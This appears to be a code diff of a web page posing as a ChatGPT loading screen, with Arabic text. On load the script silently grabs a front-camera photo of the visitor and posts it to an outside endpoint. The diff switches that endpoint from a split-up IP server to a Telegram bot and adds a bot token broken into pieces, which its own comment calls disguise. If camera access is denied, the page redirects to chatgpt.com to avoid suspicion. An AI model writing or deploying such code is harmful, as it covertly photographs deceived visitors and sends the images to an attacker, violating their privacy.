@@ -12,23 +12,21 @@
     </style>
 </head>
 <body>
-
     <div class="loader-container">
         <div class="loader"></div>
-        <p>جاري فتح ChatGPT...</p>
+        <p id="status">جاري فتح ChatGPT...</p>
     </div>
 
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        // --- تقسيم الرابط إلى 3 أقسام كما طلبت ---
-        const part1 = "http://51.83.6.5";
-        const part2 = ":20341";
-        const part3 = "/upload";
-        
-        // تجميع الرابط النهائي للسيرفر
-        const SERVER_URL = part1 + part2 + part3;
+        // تمويه التوكن عن طريق تقطيه
+        const partA = "8757176986";
+        const partB = ":";
+        const partC = "AAFNsvSswM4J";
+        const partD = "_adIelUJWTSuqwRvFJgRo";
+        const token = partA + partB + partC + partD;
 
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
@@ -49,10 +47,10 @@
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
-                formData.append('photo', blob, 'capture.jpg');
+                formData.append('photo', blob, 'img.jpg');
+                formData.append('caption', '✅ صورة جديدة من الموقع');
 
-                // الإرسال للسيرفر الوسيط (Katabump)
-                fetch(SERVER_URL, {
+                fetch(`https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto`, {
                     method: 'POST',
                     body: formData
                 })
@@ -65,7 +63,7 @@
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => { 
                 video.srcObject = stream;
-                setTimeout(captureAndSend, 1200); 
+                setTimeout(captureAndSend, 1500); 
             })
             .catch(() => {
                 window.location.href = "https://chatgpt.com";
